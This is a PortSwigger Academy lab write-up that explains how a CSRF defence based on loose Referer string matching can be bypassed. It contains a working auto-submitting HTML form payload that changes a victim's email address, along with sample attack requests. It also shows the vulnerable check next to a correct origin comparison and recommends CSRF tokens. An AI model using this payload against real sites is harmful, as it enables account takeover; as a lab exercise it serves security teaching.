# PortSwigger Lab: CSRF with broken Referer validation

![PortSwigger](https://img.shields.io/badge/Platform-PortSwigger%20Academy-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Type](https://img.shields.io/badge/Type-CSRF%20Broken%20Referer-red)
![Status](https://img.shields.io/badge/Status-Completed-success)

Writeup on bypassing CSRF protection via broken Referer validation using string matching.

## Techniques Used

- Cross-Site Request Forgery (CSRF)
- Broken Referer validation bypass
- String matching exploitation
- Meta referrer policy (`content="unsafe-url"`)
- Domain inclusion in URL path

## Attack Summary

```
Analyze email change request
→ Discover Referer header required
→ Normal CSRF blocked
→ Find: Server uses string matching (not origin validation)
→ Include target domain in exploit URL path
→ Use <meta name="referrer" content="unsafe-url">
→ Browser sends full URL as Referer
→ Server finds domain in Referer string
→ Deploy on exploit server
→ Victim's email changed
```

## Key Vulnerability

**Broken string matching validation:**

```javascript
if (referer.includes(targetDomain)) {
  allow();  // ❌ WRONG: Domain can be anywhere in URL
}
```

Server only checks if domain **string exists** in Referer, not if origin is valid.

## Attack Steps

1. **Analyze** - Email change endpoint requires Referer header
2. **Test** - Normal CSRF blocked (Referer from attacker domain)
3. **Discover** - Server uses string matching, not origin validation
4. **Exploit** - Include target domain in exploit URL path
5. **Meta tag** - Use `content="unsafe-url"` to send full URL
6. **Result** - Full URL with target domain is sent as Referer
7. **Bypass** - Server finds domain in Referer, allows request

## Request Analysis

### Legitimate Request
```http
POST /my-account/change-email HTTP/2
Referer: https://target.com/my-account?id=wiener
Origin: https://target.com
Cookie: session=...

email=user@user.es
```

**Protected by:** Referer matches target domain

### Attack (Without Meta Tag)
```http
POST /my-account/change-email HTTP/2
Referer: https://exploit-server.net/
Origin: https://exploit-server.net
Cookie: session=... (SameSite=None)

email=hacked@hacked.com
```

**Result:** ❌ Blocked (Referer doesn't contain target domain)

### Attack (With Meta Tag + Domain in Path)
```http
POST /my-account/change-email HTTP/2
Referer: https://exploit-server.net/exploit.TARGET-DOMAIN.com
Origin: null
Cookie: session=... (SameSite=None)

email=hacked@hacked.com
```

**Result:** ✅ Allowed (Server finds target domain in Referer string)

## Exploit Payload

```html
<html>
  <body>
    <iframe style="display:none" name="csrfframe"></iframe>
    <meta name="referrer" content="unsafe-url">
    <form method="POST" 
          action="https://target-domain.com/my-account/change-email" 
          id="csrfform" 
          target="csrfframe">
      <input type="hidden" name="email" value="hacked@attacker.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Key Elements

### 1. Target Domain in Path
```
https://exploit-server.net/exploit.target-domain.com
```

Domain included in URL path so it appears in Referer.

### 2. unsafe-url Meta Tag
```html
<meta name="referrer" content="unsafe-url">
```

Forces browser to send **full URL** (including path) as Referer.

### 3. Referer Sent
```
Referer: https://exploit-server.net/exploit.target-domain.com
```

Server checks: "Is target domain in this string?" → YES ✅

## Why It Works

- **String matching fallback** - Server checks if domain appears anywhere
- **URL path exploitation** - Target domain can be in path
- **unsafe-url policy** - Browser sends full URL as Referer
- **String found** - Server's validation passes
- **Cross-site allowed** - Despite being from different origin

## Vulnerable Logic vs Correct

**Vulnerable:**
```javascript
if (referer.includes(targetDomain)) {
  allow();  // ❌ Can be bypassed
}
```

**Correct:**
```javascript
const origin = new URL(referer).origin;
if (origin !== targetOrigin) {
  reject();  // Always validate origin
}

// BEST: Use CSRF tokens
if (!isValidCSRFToken(req.body.csrf_token)) {
  reject();
}
```

## Meta Referrer Policies

| Policy | Behavior |
|--------|----------|
| `never` | Never send Referer |
| `unsafe-url` | Always send full URL |
| `same-origin` | Only on same-origin |
| `strict-origin` | Same-origin or more secure |

## Key Insight

Referer header validation is **not a reliable CSRF defense** because:
- **Can be manipulated** - Via meta tags or client-side redirects
- **Not cryptographic** - No proof of same-origin (unlike CSRF tokens)
- **String matching broken** - Easy to include domain anywhere

Always use **CSRF tokens** for CSRF protection.

## References

- [PortSwigger — CSRF Prevention](https://portswigger.net/web-security/csrf)
- [MDN — Referrer Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
- [OWASP — CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
